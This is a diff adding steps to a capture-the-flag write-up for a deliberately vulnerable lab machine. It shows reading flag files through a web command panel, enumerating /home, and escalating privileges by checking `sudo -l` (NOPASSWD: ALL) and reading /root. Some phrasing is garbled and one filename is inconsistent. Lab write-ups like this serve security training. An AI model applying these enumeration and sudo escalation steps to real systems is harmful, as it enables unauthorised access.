@@ -123,4 +123,30 @@ robots.txt
 
 7. I tried ```cat Sup3rS3cretPickl3Ingred.txt``` and got trolled so bad, command is disabled.
 
+- However, i noticed there are other ```.php``` files so many if i can change the url to ```//Sup3rS3cretPickl3Ingred.txt``` and we got our first flag.
 
+8. We will search and find other users through ```ls /home``` you will see rick and ubuntu.
+- In rick's directory you will also find ```second ingredient``` but ls further will not bring you anywhere. So try running this to capture the 2nd flag.
+```bash
+less "/home/rick/second ingredients"
+```
+
+## Previlege Escalation
+
+9. Let see what can we run in sudo with ```sudo -l```:
+```
+Matching Defaults entries for www-data on ip-10-10-79-232.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-79-232.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+ ```
+ 
+ - apparently, everything.
+ 
+ 10. Run ```sudo ls /root```:
+ ```
+ 3rd.txt
+snap
+```
+- There is our 3rd file!
